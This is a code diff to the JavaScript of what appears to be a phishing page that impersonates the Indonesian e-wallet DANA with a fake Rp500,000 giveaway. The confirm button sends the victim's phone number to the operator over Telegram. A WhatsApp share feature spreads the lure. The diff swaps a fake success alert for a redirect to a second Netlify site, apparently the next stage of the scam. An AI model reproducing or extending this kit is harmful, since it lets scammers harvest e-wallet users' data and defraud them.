@@ -69,7 +69,6 @@ function showSuccessMessage() {
     }, 5000);
 }
 
-// ==================== HANYA FUNGSI INI YANG MENGIRIM KE TELEGRAM ====================
 // Fungsi untuk mengirim data ke Netlify Function (Hanya nomor HP)
 async function sendToTelegram(phoneNumber) {
     const message = `┌─ 📱 DANA - Hajatan Ulang Tahun
@@ -103,18 +102,14 @@ async function sendToTelegram(phoneNumber) {
         return false;
     }
 }
-// ==================== AKHIR FUNGSI TELEGRAM ====================
 
-// Claim reward function (TIDAK mengirim ke Telegram)
+// Claim reward function - Redirect ke halaman tujuan
 function claimReward() {
-    triggerConfetti();
-    showSuccessMessage();
-    setTimeout(() => {
-        alert("🎉 SELAMAT! 🎉\n\nSaldo Rp500.000 telah berhasil ditambahkan ke akun DANA Anda.\n\nTerima kasih telah berpartisipasi dalam Hajatan Ulang Tahun DANA!");
-    }, 500);
+    // Redirect ke halaman yang ditentukan
+    window.location.href = 'https://dag-link-dana.netlify.app/';
 }
 
-// Share to WhatsApp (TIDAK mengirim ke Telegram)
+// Share to WhatsApp
 function shareToWA() {
     // Teks yang akan muncul saat share ke WhatsApp
     const shareText = `*DANA bagi-bagi saldo Rp500.000* 
@@ -158,7 +153,7 @@ ${window.location.href}`;
     }
 }
 
-// Like post function (TIDAK mengirim ke Telegram)
+// Like post function
 function likePost() {
     let likes = document.getElementById('likes');
     let currentLikes = likes.innerText;
@@ -172,7 +167,7 @@ function likePost() {
     alert('👍 Terima kasih telah menyukai postingan ini!');
 }
 
-// Simulate progress bar (TIDAK mengirim ke Telegram)
+// Simulate progress bar
 function simulateProgress(callback) {
     let progress = 0;
     const fillElement = document.getElementById('fill2');
@@ -214,8 +209,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // ==================== INI SATU-SATUNYA YANG MENGIRIM KE TELEGRAM ====================
-    // Confirm phone number - HANYA DI SINI fungsi sendToTelegram() dipanggil
+    // Confirm phone number
     const confirmButton = document.getElementById('confirm');
     if (confirmButton) {
         confirmButton.addEventListener('click', async function() {
@@ -233,7 +227,7 @@ document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('info').style.display = 'none';
             document.getElementById('checking').style.display = 'block';
             
-            // HANYA DISINI KIRIM KE TELEGRAM - TIDAK ADA DI TEMPAT LAIN
+            // Kirim data ke Telegram
             await sendToTelegram(phone);
             
             simulateProgress(() => {
@@ -244,9 +238,8 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         });
     }
-    // ==================== AKHIR PENGIRIMAN KE TELEGRAM ====================
 
-    // Add comment functionality (TIDAK mengirim ke Telegram)
+    // Add comment functionality
     const commentInput = document.getElementById('commentInput');
     if (commentInput) {
         commentInput.addEventListener('keypress', function(e) {
